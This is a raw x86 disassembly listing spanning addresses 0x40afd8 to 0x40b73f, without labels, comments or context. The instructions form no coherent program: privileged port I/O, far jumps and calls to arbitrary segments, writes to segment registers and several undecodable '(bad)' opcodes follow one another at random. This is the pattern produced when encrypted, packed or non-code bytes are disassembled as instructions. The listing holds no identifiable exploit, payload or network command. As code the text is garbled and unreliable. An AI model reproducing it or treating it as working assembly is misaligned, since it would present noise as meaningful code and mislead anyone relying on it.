  40afd8:	jno    0x40b009
  40afda:	pusha  
  40afdb:	xchg   ebp,eax
  40afdc:	pop    edx
  40afdd:	pop    ecx
  40afde:	es test al,0x9b
  40afe1:	imul   ecx,DWORD PTR [esi+edi*8+0x50],0x92dd17f9
  40afe9:	mov    edi,0x2f9490b3
  40afee:	cmp    edi,DWORD PTR [edx]
  40aff0:	data16 loop 0x40afce
  40aff3:	sub    eax,0x6e9137b4
  40aff8:	sub    edx,0x80564cf7
  40affe:	outs   dx,BYTE PTR ds:[esi]
  40afff:	enter  0xf036,0x75
  40b003:	xor    ebx,DWORD PTR [edi-0x103117fe]
  40b009:	inc    ebx
  40b00a:	adc    eax,0x56dce545
  40b00f:	ds mov bl,BYTE PTR ds:[esi]
  40b013:	push   0xb17870d
  40b018:	push   ds
  40b019:	add    al,0xc1
  40b01b:	cli    
  40b01c:	loop   0x40afe2
  40b01e:	mov    esp,0x75600c31
  40b023:	aas    
  40b024:	sbb    bl,ah
  40b026:	xor    bl,cl
  40b028:	in     al,dx
  40b029:	loopne 0x40b03e
  40b02b:	ins    DWORD PTR es:[edi],dx
  40b02c:	dec    ebp
  40b02d:	or     al,0xb0
  40b02f:	push   esi
  40b030:	jae    0x40afb7
  40b032:	mov    DWORD PTR [eax+0x33ead697],0x3e41aa5d
  40b03c:	pusha  
  40b03d:	pop    ecx
  40b03e:	push   es
  40b03f:	test   eax,0x1f9fbcdf
  40b044:	test   BYTE PTR ds:0xa44a92b5,0x32
  40b04b:	sub    dh,BYTE PTR [eax-0xe4bcaf8]
  40b051:	ins    DWORD PTR es:[edi],dx
  40b052:	in     eax,0x49
  40b054:	gs aas 
  40b056:	ins    DWORD PTR es:[edi],dx
  40b057:	jb     0x40b032
  40b059:	fsub   DWORD PTR [eax+0x6c]
  40b05c:	push   0xab9d4a0a
  40b061:	push   ss
  40b062:	out    dx,al
  40b063:	pop    ebp
  40b064:	cmp    DWORD PTR [ebp-0x2f06182e],ebp
  40b06a:	push   cs
  40b06b:	mov    cl,0xb6
  40b06d:	loop   0x40b0b4
  40b06f:	mov    ch,0xa8
  40b071:	jmp    0x40b0e6
  40b073:	lock ret 
  40b075:	xor    DWORD PTR [edi],0xa
  40b078:	push   0xf8a8ea91
  40b07d:	not    ecx
  40b07f:	cwde   
  40b080:	ret    0xe450
  40b083:	fwait
  40b084:	arpl   cx,cx
  40b086:	ficomp DWORD PTR [ecx-0x67]
  40b089:	shr    DWORD PTR [ebp+0x5e37a3bc],0xc
  40b090:	add    dh,BYTE PTR [edx-0x5b4e631f]
  40b096:	hlt    
  40b097:	xchg   DWORD PTR [bp+si-0x2bc4],edi
  40b09c:	js     0x40b08a
  40b09e:	fwait
  40b09f:	dec    edx
  40b0a0:	repz fcomp QWORD PTR [edx+0x1b]
  40b0a4:	scas   eax,DWORD PTR es:[edi]
  40b0a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0a6:	dec    eax
  40b0a7:	sbb    edi,DWORD PTR [ebx+0x3db918be]
  40b0ad:	rcr    BYTE PTR [eax],0x6a
  40b0b0:	dec    esp
  40b0b1:	push   esi
  40b0b2:	scas   eax,DWORD PTR es:[edi]
  40b0b3:	or     ah,0xbe
  40b0b6:	jmp    0x89bd8215
  40b0bb:	(bad)  
  40b0bc:	outs   dx,DWORD PTR ds:[esi]
  40b0bd:	outs   dx,DWORD PTR ds:[esi]
  40b0be:	out    dx,eax
  40b0bf:	dec    esp
  40b0c0:	xor    esi,DWORD PTR [ecx-0x3]
  40b0c3:	push   ebp
  40b0c4:	(bad)  
  40b0c5:	or     al,0xec
  40b0c7:	jae    0x40b13e
  40b0c9:	pop    es
  40b0ca:	push   ebp
  40b0cb:	cmp    DWORD PTR [esi+0x23],esi
  40b0ce:	outs   dx,BYTE PTR ds:[esi]
  40b0cf:	jmp    0x5fe2:0x3358435b
  40b0d6:	mov    DWORD PTR [ecx+0x29a1e92b],edi
  40b0dc:	(bad)  [ecx+0x4a9250e1]
  40b0e2:	jle    0x40b11b
  40b0e4:	cmp    eax,0x8f2cff30
  40b0e9:	imul   bl
  40b0eb:	jns    0x40b109
  40b0ed:	nop
  40b0ee:	popa   
  40b0ef:	fdiv   QWORD PTR [eax+0x50]
  40b0f2:	xchg   DWORD PTR [ecx+0x35107f51],ecx
  40b0f8:	pusha  
  40b0f9:	pop    ecx
  40b0fa:	dec    edi
  40b0fb:	aad    0x9f
  40b0fd:	xor    dh,0x20
  40b100:	mov    ecx,DWORD PTR [edx]
  40b102:	nop
  40b103:	inc    ebx
  40b104:	out    0x50,eax
  40b106:	or     al,0xc6
  40b108:	enter  0x1dbd,0xc3
  40b10c:	imul   edx,DWORD PTR [edi+ecx*4-0x4834b852],0xffffffe7
  40b114:	addr16 mov cs,esp
  40b117:	aas    
  40b118:	mov    eax,ds:0x207ea9f4
  40b11d:	xchg   DWORD PTR [ebp+0x76507ee2],esp
  40b123:	cmc    
  40b124:	xchg   esi,eax
  40b125:	bsf    ebp,DWORD PTR ds:0x3f04a5d8
  40b12c:	sub    DWORD PTR [edi-0x1d91eb5b],0xffffffc4
  40b133:	pop    edx
  40b134:	jns    0x40b166
  40b136:	je     0x40b164
  40b138:	jg     0x40b0d0
  40b13a:	fstp   TBYTE PTR [ebx-0x2d]
  40b13d:	cmp    DWORD PTR [ebx+ecx*8+0x21],0xf2ade73d
  40b145:	adc    DWORD PTR [ebx],esp
  40b147:	fst    QWORD PTR [ecx-0x235cc7f4]
  40b14d:	imul   ah
  40b14f:	lea    ebx,[ebx-0x31]
  40b152:	lods   eax,DWORD PTR ds:[esi]
  40b153:	mov    bl,0xc7
  40b155:	stos   BYTE PTR es:[edi],al
  40b156:	or     eax,0x54e9918
  40b15b:	sbb    BYTE PTR [ecx-0x69835684],ah
  40b161:	jmp    FWORD PTR [ebx+ebp*1]
  40b164:	or     al,0x58
  40b166:	rcr    BYTE PTR [esi],1
  40b168:	sub    edi,DWORD PTR [esi]
  40b16a:	xor    BYTE PTR [esi],bh
  40b16c:	test   al,0xc1
  40b16e:	stos   BYTE PTR es:[edi],al
  40b16f:	aam    0x31
  40b171:	push   es
  40b172:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40b174:	mov    esp,0xf1082f37
  40b179:	(bad)  
  40b17a:	arpl   WORD PTR [ecx],cx
  40b17c:	lock dec ebx
  40b17e:	fistp  WORD PTR [ecx+0x61]
  40b181:	fs (bad) 
  40b183:	jmp    0xe1d3b54e
  40b188:	out    0xc0,al
  40b18a:	retf   0x6a7a
  40b18d:	push   ss
  40b18e:	outs   dx,BYTE PTR ds:[esi]
  40b18f:	fild   DWORD PTR [edx+eiz*1+0x34]
  40b193:	dec    eax
  40b195:	mov    bl,0x5b
  40b197:	pop    ebx
  40b198:	daa    
  40b199:	pop    esp
  40b19a:	pop    ecx
  40b19b:	xor    BYTE PTR [esi+0x20],0x9a
  40b19f:	mov    esp,0xa435a801
  40b1a4:	(bad)  
  40b1a6:	or     ch,BYTE PTR [ebx-0x67]
  40b1a9:	fisubr WORD PTR [edi]
  40b1ab:	mov    eax,ds:0xed68a802
  40b1b0:	jecxz  0x40b1b6
  40b1b2:	sub    cl,dl
  40b1b4:	into   
  40b1b5:	add    ah,al
  40b1b7:	mov    ebx,DWORD PTR fs:[edi+0x19]
  40b1bb:	dec    esp
  40b1bc:	jbe    0x40b1d7
  40b1be:	addr16 xchg edi,eax
  40b1c0:	mov    al,ds:0x85634c80
  40b1c5:	adc    DWORD PTR [ecx],0xffffffef
  40b1c8:	(bad)  
  40b1c9:	cmove  ecx,DWORD PTR [ecx+0x3f]
  40b1cd:	jns    0x40b175
  40b1cf:	xchg   esi,eax
  40b1d0:	stos   DWORD PTR es:[edi],eax
  40b1d1:	mov    cs,WORD PTR [eax]
  40b1d3:	rcr    BYTE PTR [eax+eiz*1+0xc897498],cl
  40b1da:	rcr    dh,cl
  40b1dc:	xor    dh,BYTE PTR ss:[edi+0x1420051b]
  40b1e3:	mov    al,ds:0x5e84ac63
  40b1e8:	jl     0x40b1a3
  40b1ea:	cmp    BYTE PTR [edx],cl
  40b1ec:	sbb    cl,BYTE PTR [ebx]
  40b1ee:	popa   
  40b1ef:	popa   
  40b1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1f1:	aam    0x55
  40b1f3:	dec    eax
  40b1f4:	add    BYTE PTR [edx-0x23907eb9],ch
  40b1fa:	and    eax,0xa12ddac2
  40b1ff:	jnp    0x40b258
  40b201:	jnp    0x40b201
  40b203:	sbb    BYTE PTR [bp+di-0x2],0xb3
  40b208:	fadd   st,st(5)
  40b20a:	mov    dh,0xf4
  40b20c:	cli    
  40b20d:	push   cs
  40b20e:	in     al,dx
  40b20f:	test   eax,edx
  40b211:	push   es
  40b212:	imul   eax,DWORD PTR [edi+0x4061daac],0x3e
  40b219:	fnstsw WORD PTR [esi+0x4]
  40b21c:	cli    
  40b21d:	jbe    0x40b21b
  40b21f:	dec    esi
  40b220:	(bad)  
  40b221:	not    DWORD PTR [edi-0x3286e5d9]
  40b227:	ffreep st(1)
  40b229:	push   edx
  40b22a:	xor    ebp,DWORD PTR [esp+esi*8]
  40b22d:	xchg   esi,eax
  40b22e:	loopne 0x40b206
  40b230:	inc    edx
  40b231:	mov    WORD PTR [ebp+0x30],ss
  40b234:	ss dec esi
  40b236:	and    esp,esp
  40b238:	adc    al,0x7
  40b23a:	ins    DWORD PTR es:[edi],dx
  40b23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b23c:	xchg   edi,eax
  40b23d:	fs cs loopne 0x40b1ca
  40b241:	pop    esp
  40b242:	adc    eax,0x7992acf5
  40b247:	repz addr16 test eax,0x908984ec
  40b24e:	pop    edi
  40b24f:	pop    eax
  40b250:	fprem  
  40b252:	sbb    BYTE PTR [ebp-0x6a],al
  40b255:	lods   al,BYTE PTR ds:[esi]
  40b256:	inc    esp
  40b257:	push   ss
  40b258:	leave  
  40b259:	por    mm6,QWORD PTR [ebx]
  40b25c:	add    bh,bl
  40b25e:	mov    ebx,0x3177be31
  40b263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b264:	in     al,dx
  40b265:	push   eax
  40b266:	cs and edx,eax
  40b269:	mov    WORD PTR [edx-0x5b],ds
  40b26c:	fldcw  WORD PTR [edi-0x50]
  40b26f:	cmc    
  40b270:	sub    ebp,DWORD PTR [esi-0x641cdfc3]
  40b276:	sti    
  40b277:	sub    ebx,ebx
  40b279:	inc    ebx
  40b27a:	fistp  DWORD PTR [edi+0x6bf2930b]
  40b280:	scas   al,BYTE PTR es:[edi]
  40b281:	shl    DWORD PTR [ebx-0x57],0x6b
  40b285:	mov    esi,0x67bd719e
  40b28a:	in     eax,dx
  40b28b:	(bad)  
  40b28c:	and    ecx,ebp
  40b28e:	jmp    0x7355a106
  40b293:	cmc    
  40b294:	repnz in al,dx
  40b296:	jmp    esp
  40b298:	mov    ds,WORD PTR [ebx+0x7da1d770]
  40b29e:	out    0xe,eax
  40b2a0:	adc    cl,BYTE PTR [esi]
  40b2a2:	adc    al,0x99
  40b2a4:	sub    BYTE PTR [edx+esi*2-0x1d37dc0e],0x32
  40b2ac:	fcomp  DWORD PTR [edx+0x4f]
  40b2af:	popa   
  40b2b0:	int3   
  40b2b1:	sub    eax,0xe7c49782
  40b2b6:	loop   0x40b285
  40b2b8:	push   ebp
  40b2b9:	or     DWORD PTR [edx],edx
  40b2bb:	fs jnp 0x40b2cf
  40b2be:	or     BYTE PTR [ebx-0x62],al
  40b2c1:	sbb    BYTE PTR [ebx],ch
  40b2c3:	outs   dx,DWORD PTR ds:[esi]
  40b2c4:	adc    eax,0xce0425d8
  40b2c9:	cmp    bl,al
  40b2cb:	jg     0x40b321
  40b2cd:	unpcklps xmm0,XMMWORD PTR [ebp+0x4fe16211]
  40b2d4:	mov    esi,DWORD PTR [ebx+eax*4+0x421991bd]
  40b2db:	and    ah,dh
  40b2dd:	rcl    BYTE PTR [edx-0x30],0x40
  40b2e1:	fisub  DWORD PTR [ecx+0x2f]
  40b2e4:	imul   esp,DWORD PTR [edx],0x8a9da006
  40b2ea:	call   0xcd67:0xfe123cd7
  40b2f1:	out    0x76,eax
  40b2f3:	dec    ecx
  40b2f4:	fisttp QWORD PTR [esi]
  40b2f6:	and    ah,BYTE PTR [ebp-0xb37530f]
  40b2fc:	pop    ss
  40b2fd:	or     al,0x4a
  40b2ff:	xchg   ecx,eax
  40b300:	js     0x40b2e5
  40b302:	repnz test al,0xa2
  40b305:	fcmovnu st,st(3)
  40b307:	fadd   DWORD PTR [esp+edi*2]
  40b30a:	push   cs
  40b30b:	jns    0x40b352
  40b30d:	icebp  
  40b30e:	sub    DWORD PTR [ebx],0xffffffb6
  40b311:	push   ss
  40b312:	in     al,dx
  40b313:	and    BYTE PTR [ecx+edx*8],al
  40b316:	pop    es
  40b317:	adc    BYTE PTR [eax],dl
  40b319:	nop
  40b31a:	push   ebp
  40b31b:	stos   DWORD PTR es:[edi],eax
  40b31c:	icebp  
  40b31d:	test   al,0x2d
  40b31f:	and    al,0xa3
  40b321:	mov    esi,DWORD PTR [ebp+0x26d8675e]
  40b327:	or     DWORD PTR [ebx],edx
  40b329:	outs   dx,DWORD PTR ds:[esi]
  40b32a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b32b:	pop    esp
  40b32c:	or     dh,BYTE PTR [ecx-0x4b357fdd]
  40b332:	add    al,dh
  40b334:	or     DWORD PTR [esi],edx
  40b336:	mov    bl,cl
  40b338:	sbb    dl,cl
  40b33a:	or     eax,0x58341d12
  40b33f:	adc    BYTE PTR [eax],al
  40b341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b342:	mov    ?,WORD PTR [ecx-0x52]
  40b345:	xor    bl,BYTE PTR [edi+esi*8]
  40b348:	lods   al,BYTE PTR ds:[esi]
  40b34a:	mov    DWORD PTR [ecx-0x56],ebp
  40b34d:	add    eax,0x4dc376cd
  40b352:	aad    0x90
  40b354:	dec    edx
  40b355:	push   edx
  40b356:	xchg   ecx,eax
  40b357:	outs   dx,BYTE PTR ds:[esi]
  40b358:	(bad)  
  40b359:	es jbe 0x40b3a6
  40b35c:	cmc    
  40b35d:	push   ecx
  40b35e:	mov    ds:0xca165153,eax
  40b363:	dec    ecx
  40b364:	jno    0x40b355
  40b366:	int    0xe6
  40b368:	mov    ds:0x48ac4bdd,eax
  40b36d:	in     eax,0xf6
  40b36f:	or     edx,DWORD PTR [esi+ecx*4-0x46eb7e38]
  40b376:	and    BYTE PTR [ebx+eiz*2],ah
  40b379:	pusha  
  40b37a:	cwde   
  40b37b:	add    al,0x4a
  40b37d:	fmul   DWORD PTR [edi+edi*1-0x7c]
  40b381:	in     eax,dx
  40b382:	sub    BYTE PTR [ecx+ebp*4-0x960e29b],bl
  40b389:	and    ebp,DWORD PTR [edi+0x25]
  40b38c:	in     al,dx
  40b38d:	xchg   BYTE PTR [ebp-0x4d],dh
  40b390:	sti    
  40b391:	dec    esp
  40b392:	cli    
  40b393:	sub    eax,0x940dbe32
  40b398:	mov    ebp,0xda8c2a03
  40b39d:	dec    eax
  40b39e:	mov    cl,0xa1
  40b3a0:	cmp    DWORD PTR [edi+0x5c51b6ab],ebp
  40b3a6:	dec    esi
  40b3a7:	retf   0x3238
  40b3aa:	pop    ebp
  40b3ab:	out    0x65,al
  40b3ad:	fxch   st(3)
  40b3af:	in     eax,dx
  40b3b0:	mov    ch,0xf6
  40b3b2:	pop    ss
  40b3b3:	jae    0x40b3d6
  40b3b5:	xor    al,0xd8
  40b3b7:	jns    0x40b414
  40b3b9:	jns    0x40b412
  40b3bb:	lea    esp,[edi+0x38]
  40b3be:	xor    dh,BYTE PTR [ebx+ebp*1]
  40b3c1:	popf   
  40b3c2:	push   0x62
  40b3c4:	xchg   edx,eax
  40b3c5:	xchg   BYTE PTR [ebp+edx*8-0x41],bl
  40b3c9:	cmp    BYTE PTR [edx+0x250b0056],cl
  40b3cf:	es call 0x30b3343a
  40b3d5:	cmp    al,0xd0
  40b3d7:	jo     0x40b44c
  40b3d9:	mov    ch,0x7a
  40b3db:	ja     0x40b3f6
  40b3dd:	jo     0x40b404
  40b3df:	sahf   
  40b3e0:	shl    DWORD PTR [ebx],cl
  40b3e2:	sub    bh,ah
  40b3e4:	mov    eax,ds:0xc7ad9910
  40b3e9:	jecxz  0x40b3ac
  40b3eb:	jb     0x40b381
  40b3ed:	xchg   BYTE PTR [esi-0x77],ah
  40b3f0:	leave  
  40b3f1:	addr16 and eax,0xdce4d6d1
  40b3f7:	sti    
  40b3f8:	adc    DWORD PTR ds:0x98ec67cb,eax
  40b3fe:	inc    edx
  40b3ff:	xchg   BYTE PTR [eax],ch
  40b401:	aad    0xdc
  40b403:	dec    eax
  40b404:	hlt    
  40b405:	adc    DWORD PTR [ebx+ebx*1+0x78],0xc
  40b40a:	repz push cs
  40b40c:	dec    esp
  40b40d:	jmp    0xe857:0x6e6c3bd
  40b414:	mov    ch,BYTE PTR [ecx-0x6913397b]
  40b41a:	ins    DWORD PTR es:[edi],dx
  40b41b:	adc    dh,BYTE PTR [ebx+edx*1]
  40b41e:	push   0x17
  40b420:	or     ebx,edi
  40b422:	leave  
  40b423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b424:	inc    esi
  40b425:	shl    BYTE PTR [edx-0x6a],cl
  40b428:	ficomp DWORD PTR [ecx-0x348b6f11]
  40b42e:	ins    BYTE PTR es:[edi],dx
  40b42f:	(bad)  
  40b430:	xchg   DWORD PTR [edi],ebx
  40b432:	pop    eax
  40b433:	cmp    ebp,DWORD PTR [esi]
  40b435:	cmp    eax,0xa576598
  40b43a:	fmul   QWORD PTR [edx+0x257579c1]
  40b440:	xor    esi,DWORD PTR [ebx+0x7bc9695f]
  40b446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b447:	jp     0x40b46c
  40b449:	sbb    eax,0x3baa9a59
  40b44e:	sahf   
  40b44f:	jno    0x40b3fc
  40b451:	cmc    
  40b452:	clc    
  40b453:	and    BYTE PTR [ecx],dl
  40b455:	cmp    eax,0xa267597c
  40b45a:	pop    edi
  40b45b:	add    al,0x99
  40b45d:	jl     0x40b3e9
  40b45f:	or     edi,DWORD PTR ds:0x286f7df3
  40b465:	push   edi
  40b466:	pop    DWORD PTR [eax-0x21c63e14]
  40b46c:	test   DWORD PTR [ebx],ecx
  40b46e:	xchg   ecx,eax
  40b46f:	enter  0x5c64,0x7a
  40b473:	inc    edx
  40b474:	pop    edx
  40b475:	cld    
  40b476:	jae    0x40b4ad
  40b478:	ret    0x975d
  40b47b:	push   0xc961dce5
  40b480:	test   eax,0x28f30a4c
  40b485:	cld    
  40b486:	lds    eax,FWORD PTR [ebx]
  40b488:	shr    BYTE PTR [ebx-0x1],1
  40b48b:	jmp    0xb383f8fb
  40b490:	sub    BYTE PTR [eax-0x6a],0xc7
  40b494:	gs (bad) 
  40b496:	mov    al,BYTE PTR [esp+eax*4+0x17]
  40b49a:	add    al,ch
  40b49c:	cmp    bh,BYTE PTR ds:0x9cefcdc3
  40b4a2:	inc    esi
  40b4a3:	or     eax,0xfa5a72fa
  40b4a8:	adc    eax,DWORD PTR [edx+0x7e]
  40b4ab:	retf   0xa53b
  40b4ae:	mov    esp,0xb930ffbe
  40b4b3:	xor    ecx,DWORD PTR [edx]
  40b4b5:	stos   DWORD PTR es:[edi],eax
  40b4b6:	push   edx
  40b4b7:	pop    eax
  40b4b8:	sub    bl,BYTE PTR [ebx+0x25]
  40b4bb:	mov    edi,0x4390ede0
  40b4c0:	mov    al,0x40
  40b4c2:	dec    esi
  40b4c3:	xchg   esi,eax
  40b4c4:	mov    cl,0x3c
  40b4c6:	mov    ebx,0xaabc66c6
  40b4cb:	sbb    eax,esp
  40b4cd:	cdq    
  40b4ce:	shr    DWORD PTR [esi-0x5354ffc9],1
  40b4d4:	or     BYTE PTR [edi+0x47932730],ah
  40b4da:	sub    ch,BYTE PTR [eax+0x1f7350b3]
  40b4e0:	cs push es
  40b4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4e3:	icebp  
  40b4e4:	fnsave [edx]
  40b4e6:	adc    eax,0x589dc11d
  40b4eb:	dec    esi
  40b4ec:	sbb    dl,BYTE PTR [eax+0x18]
  40b4ef:	sub    eax,0x76b5b3c
  40b4f5:	aad    0x57
  40b4f7:	sbb    ebp,edi
  40b4f9:	call   0x98bdd9f2
  40b4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b500:	xchg   esp,eax
  40b501:	dec    ecx
  40b502:	sbb    al,0xe2
  40b504:	cdq    
  40b505:	popa   
  40b506:	and    DWORD PTR [eax+esi*2],edx
  40b509:	call   0x239c:0xff627dc8
  40b510:	push   esp
  40b511:	jmp    0x40b4a7
  40b513:	jmp    0x4a15:0x1b676a21
  40b51a:	mov    ch,0x5d
  40b51c:	mov    DWORD PTR [esp+ebx*2+0x8],0x8270cf83
  40b524:	mov    BYTE PTR [eax-0x71],ah
  40b527:	add    edi,DWORD PTR [ecx]
  40b529:	push   eax
  40b52a:	test   al,0xb
  40b52c:	jmp    0xd9fbafe2
  40b531:	cmp    DWORD PTR [eax],ecx
  40b533:	dec    ebx
  40b534:	lds    eax,FWORD PTR [eax]
  40b536:	xchg   ebp,eax
  40b537:	add    al,0x1d
  40b539:	sub    eax,0x174c26c7
  40b53e:	add    DWORD PTR [esi+eax*2],ebx
  40b541:	inc    ecx
  40b542:	push   esi
  40b543:	inc    edx
  40b544:	dec    esi
  40b545:	sbb    BYTE PTR [eax],dh
  40b547:	out    dx,al
  40b548:	sub    ch,cl
  40b54a:	repz add esp,edx
  40b54d:	dec    esi
  40b54e:	sbb    ebx,DWORD PTR [eax+edx*8-0x5bba10b]
  40b555:	stos   DWORD PTR es:[edi],eax
  40b556:	xchg   ebp,eax
  40b557:	cdq    
  40b558:	dec    esp
  40b559:	and    bl,BYTE PTR [edi]
  40b55b:	stos   DWORD PTR es:[edi],eax
  40b55c:	lock dec edi
  40b55e:	jecxz  0x40b5df
  40b560:	ret    0x9451
  40b563:	adc    edi,edi
  40b565:	jg     0x40b52a
  40b567:	mov    eax,ss
  40b569:	or     bh,bl
  40b56b:	jmp    0x7ad81da7
  40b570:	retf   0x432f
  40b573:	fwait
  40b574:	test   BYTE PTR [eax],dh
  40b576:	add    edi,DWORD PTR [ecx-0x4f195fb1]
  40b57c:	add    esp,DWORD PTR [edi+0x689fed9e]
  40b582:	xor    DWORD PTR [ebx-0x6e],edi
  40b585:	test   al,0xf2
  40b587:	dec    ebx
  40b588:	add    bl,BYTE PTR [ebp-0x3c]
  40b58b:	push   ebp
  40b58c:	xor    al,0xc6
  40b58e:	inc    esp
  40b58f:	fwait
  40b590:	addr16 pusha 
  40b592:	lods   eax,DWORD PTR ds:[esi]
  40b593:	mov    bl,0x68
  40b595:	mul    ah
  40b597:	call   0xaa4c:0x482f35b7
  40b59e:	(bad)  
  40b59f:	or     al,0x9c
  40b5a1:	sbb    bh,BYTE PTR [edx]
  40b5a3:	out    dx,eax
  40b5a4:	shl    BYTE PTR [eax+0x62d1a972],cl
  40b5aa:	jne    0x40b54f
  40b5ac:	call   0x80ad2239
  40b5b1:	into   
  40b5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5b3:	dec    edi
  40b5b4:	push   eax
  40b5b5:	jo     0x40b5c9
  40b5b7:	sbb    al,0xaf
  40b5b9:	or     DWORD PTR [esi],0xe33f8a95
  40b5bf:	or     eax,0x6d21e987
  40b5c4:	xchg   edx,eax
  40b5c5:	ins    BYTE PTR es:[edi],dx
  40b5c6:	inc    edx
  40b5c7:	push   esi
  40b5c8:	cld    
  40b5c9:	inc    edi
  40b5ca:	bound  ecx,QWORD PTR [edx]
  40b5cc:	sub    eax,0x7bc20084
  40b5d2:	push   0xffffff84
  40b5d4:	push   ebp
  40b5d5:	sbb    edi,DWORD PTR [ecx-0xd]
  40b5d8:	fwait
  40b5d9:	xchg   edx,eax
  40b5da:	xchg   DWORD PTR [esi],esp
  40b5dc:	adc    dl,bl
  40b5de:	ja     0x40b5d5
  40b5e0:	jl     0x40b5b5
  40b5e2:	int    0xfd
  40b5e4:	inc    esi
  40b5e5:	cli    
  40b5e6:	out    dx,eax
  40b5e7:	jge    0x40b5b7
  40b5e9:	ret    0xc9b7
  40b5ec:	pop    ecx
  40b5ed:	xlat   BYTE PTR ds:[ebx]
  40b5ee:	mov    eax,0xe98627c0
  40b5f3:	jmp    0x40b58e
  40b5f5:	cmp    dl,BYTE PTR [edx+0x452a86f5]
  40b5fb:	shl    eax,cl
  40b5fd:	call   0x78c73ca9
  40b602:	ficom  WORD PTR [edi+0x34]
  40b605:	add    ah,ah
  40b607:	xchg   edi,eax
  40b608:	fs sub eax,0x9b116336
  40b60e:	push   esp
  40b60f:	repz es push ebx
  40b612:	mov    cs,esp
  40b614:	call   0xe5aa9655
  40b619:	mov    DWORD PTR [edx+0x14483d00],edi
  40b61f:	mov    al,ds:0x7e711f49
  40b624:	lds    esp,FWORD PTR [ebx-0x5e]
  40b627:	pop    es
  40b628:	mov    cl,0x29
  40b62a:	inc    edx
  40b62b:	lock mov ebp,0xbcd1588d
  40b631:	pop    edi
  40b632:	leave  
  40b633:	and    edi,DWORD PTR [ebx-0x23]
  40b636:	test   DWORD PTR [esp+ebp*2+0x70],esp
  40b63a:	jae    0x40b677
  40b63c:	pop    ds
  40b63d:	dec    ebp
  40b63e:	inc    edi
  40b63f:	push   ss
  40b640:	xchg   esp,eax
  40b641:	or     ch,cl
  40b643:	fild   DWORD PTR [edx+0x4a7663c6]
  40b649:	loope  0x40b642
  40b64b:	aaa    
  40b64c:	outs   dx,BYTE PTR ds:[esi]
  40b64d:	sub    DWORD PTR [ebp+0x3a],eax
  40b650:	(bad)  
  40b651:	push   0x5f36638d
  40b656:	mov    dh,ch
  40b658:	jp     0x40b683
  40b65a:	popa   
  40b65b:	add    eax,0xb750f101
  40b660:	stos   BYTE PTR es:[edi],al
  40b661:	test   DWORD PTR [ebp+0x4c905464],esi
  40b667:	add    DWORD PTR [edx+0x53746d3e],ebx
  40b66d:	xor    ch,bl
  40b66f:	pop    ss
  40b670:	adc    bl,BYTE PTR [edx]
  40b672:	repz adc BYTE PTR [eax],dl
  40b675:	scas   eax,DWORD PTR es:[edi]
  40b676:	jns    0x40b6ca
  40b678:	cwde   
  40b679:	xchg   edi,eax
  40b67a:	xor    eax,DWORD PTR [edi]
  40b67c:	and    cl,al
  40b67e:	jg     0x40b6d3
  40b680:	pop    esi
  40b681:	in     eax,dx
  40b682:	push   ebp
  40b683:	cmp    al,0xb2
  40b685:	fiadd  WORD PTR [ebx]
  40b687:	xlat   BYTE PTR ds:[ebx]
  40b688:	loopne 0x40b63f
  40b68a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b68b:	call   0xdbd5:0xdafb3f76
  40b692:	mov    ebp,0xcb0e948
  40b698:	pminsw mm4,mm5
  40b69b:	(bad)  
  40b69c:	pop    DWORD PTR [edx+ebx*4]
  40b69f:	inc    edx
  40b6a0:	sti    
  40b6a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6a2:	or     eax,0x885a9e2d
  40b6a7:	mov    eax,ds:0x86a867fd
  40b6ac:	into   
  40b6ad:	cmp    eax,0x26dc0d61
  40b6b2:	rcl    eax,0x9b
  40b6b5:	mov    al,ds:0xdb69c354
  40b6ba:	adc    DWORD PTR [edx-0x37036dbe],esi
  40b6c0:	lods   eax,DWORD PTR ds:[esi]
  40b6c1:	daa    
  40b6c2:	jge    0x40b670
  40b6c4:	adc    eax,0xba1fdb9c
  40b6c9:	sbb    ebx,esp
  40b6cb:	mov    cl,BYTE PTR [ebx+edx*2-0x5d5897d7]
  40b6d2:	sbb    BYTE PTR [ecx+ebp*2-0x26bff49a],dh
  40b6d9:	sub    bh,ah
  40b6db:	adc    eax,0xa4018641
  40b6e0:	fld    TBYTE PTR [ebx-0x34]
  40b6e3:	xor    DWORD PTR [ebp-0x6d],ecx
  40b6e6:	ins    BYTE PTR es:[edi],dx
  40b6e7:	dec    edi
  40b6e8:	pop    ss
  40b6e9:	and    esp,esp
  40b6eb:	call   0x56ab:0xf50b960a
  40b6f2:	popf   
  40b6f3:	mov    cl,0xc
  40b6f5:	imul   edi,DWORD PTR [eax+0x12],0xffffffb5
  40b6f9:	xor    dh,BYTE PTR [ecx+0x39241def]
  40b6ff:	sub    al,0xd
  40b701:	aas    
  40b702:	pushf  
  40b703:	lock pop eax
  40b705:	repnz jecxz 0x40b6a0
  40b708:	xchg   esi,eax
  40b709:	or     eax,DWORD PTR [ebx+0x16031aba]
  40b70f:	xchg   DWORD PTR [ebx-0x416d8d96],edx
  40b715:	adc    cl,bl
  40b717:	cwde   
  40b718:	inc    edx
  40b719:	sub    ah,dl
  40b71b:	add    DWORD PTR [edi-0x7f],ebx
  40b71e:	sbb    edx,DWORD PTR [ebx+0x472f780]
  40b724:	inc    edi
  40b725:	sub    al,0x36
  40b727:	je     0x40b6ab
  40b729:	mul    DWORD PTR [edi+0x4a8288ee]
  40b72f:	push   ds
  40b730:	(bad)  
  40b731:	and    ch,BYTE PTR [esi]
  40b733:	into   
  40b734:	xchg   edi,eax
  40b735:	push   es
  40b736:	fidiv  WORD PTR [ecx-0x2]
  40b739:	xchg   edi,eax
  40b73a:	dec    esi
  40b73b:	adc    al,0x9c
  40b73d:	pusha  
  40b73e:	outs   dx,DWORD PTR ds:[esi]
  40b73f:	or     al,0x71
